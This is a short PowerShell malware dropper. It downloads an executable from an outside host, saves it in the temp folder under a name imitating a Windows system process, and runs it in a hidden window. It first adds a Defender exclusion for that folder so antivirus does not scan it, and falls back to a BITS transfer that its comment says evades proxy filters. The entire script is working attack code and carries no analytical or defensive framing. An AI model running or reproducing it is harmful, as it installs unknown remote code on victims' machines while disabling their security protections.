# ╔══════════════════════════════════════════════════════════════════╗
# ║  CONFIG                                                         ║
# ╠══════════════════════════════════════════════════════════════════╣

$EXE_URL  = 'http://kekman.space/verify.exe'   # remote exe to drop
$EXE_NAME = 'svchost32.exe'               # name on disk under %TEMP%
$AV_EXCL  = $true                         # blind Defender to %TEMP%

# ╚══════════════════════════════════════════════════════════════════╝

# 1 — optionally exclude %TEMP% from Defender real-time scanning
if ($AV_EXCL) {
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
}

# 2 — drop exe
$dest = Join-Path $env:TEMP $EXE_NAME

try {
    (New-Object Net.WebClient).DownloadFile($EXE_URL, $dest)
} catch {
    # fallback: BITS transfer (bypasses some proxy filters)
    Start-BitsTransfer -Source $EXE_URL -Destination $dest -ErrorAction Stop
}

# 3 — execute hidden
if (Test-Path $dest) {
    Start-Process -FilePath $dest -WindowStyle Hidden
}